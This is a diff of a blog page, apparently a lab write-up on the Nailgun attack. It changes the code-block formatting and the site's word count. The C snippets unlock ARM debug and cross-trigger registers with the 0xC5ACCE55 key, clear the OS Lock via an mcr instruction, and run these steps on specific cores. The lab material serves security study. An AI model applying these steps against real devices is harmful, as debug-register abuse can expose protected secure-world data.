+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Step 1: Unlock debug and cross trigger reigsters</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> nailgun_param <span class="op">*</span>param <span class="op">=</span> <span class="op">(</span><span class="kw">struct</span> nailgun_param<span class="op">*)</span>addr<span class="op">;</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>    printk<span class="op">(</span>KERN_INFO<span class="st">&quot;Step 1: Unlock debug and cross trigger registers</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>    iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>debug_register <span class="op">+</span> EDLAR_OFFSET<span class="op">);</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>    iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>cti_register <span class="op">+</span> EDLAR_OFFSET<span class="op">);</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>    printk<span class="op">(</span>KERN_INFO<span class="st">&quot;Step 1(Add): Lock OS registers</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>    iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>debug_register <span class="op">+</span> OSLAR_OFFSET<span class="op">);</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>    iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>cti_register <span class="op">+</span> OSLAR_OFFSET<span class="op">);</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
 <p>unlock the OS Lock <strong>by executing the code directly on core
 0.</strong></p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">static void unlock_debug(void* _) &#123;
-	&#x2F;&#x2F; Unlock self debug registers
-	printk(KERN_INFO &quot;Step 1(Add): unlock the OS Lock not using MAP\n&quot;);
-	uint32_t reg &#x3D; 0;
-	asm volatile(&quot;mcr p14, 0, %0, c1, c0, 4&quot;:&quot;&#x3D;r&quot;(reg));
-&#125;</code></pre>
+<div class="sourceCode" id="cb17"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> unlock_debug<span class="op">(</span><span class="dt">void</span><span class="op">*</span> _<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Unlock self debug registers</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>    printk<span class="op">(</span>KERN_INFO <span class="st">&quot;Step 1(Add): unlock the OS Lock not using MAP</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint32_t</span> reg <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>    asm <span class="dt">volatile</span><span class="op">(</span><span class="st">&quot;mcr p14, 0, %0, c1, c0, 4&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>reg<span class="op">));</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
 <p>Change <code>nailgun_init</code> <strong>as follows:</strong></p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">smp_call_function_single(1,read_scr1,param,1);
-smp_call_function_single(0, unlock_debug, param, 1);
-smp_call_function_single(1,read_scr,param,1);</code></pre>
+<div class="sourceCode" id="cb18"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>smp_call_function_single<span class="op">(</span><span class="dv">1</span><span class="op">,</span>read_scr1<span class="op">,</span>param<span class="op">,</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>smp_call_function_single<span class="op">(</span><span class="dv">0</span><span class="op">,</span> unlock_debug<span class="op">,</span> param<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>smp_call_function_single<span class="op">(</span><span class="dv">1</span><span class="op">,</span>read_scr<span class="op">,</span>param<span class="op">,</span><span class="dv">1</span><span class="op">);</span></span></code></pre></div>
 <p>Therefore, we can unlock the OS Lock in this lab except memory
 mapping</p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q2_2.png" /></p>
@@ -688,13 +684,13 @@ mapping</p>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">21k</span>
+    <span title="站点总字数">19k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19 分钟</span>
+    <span title="站点阅读时长">17 分钟</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
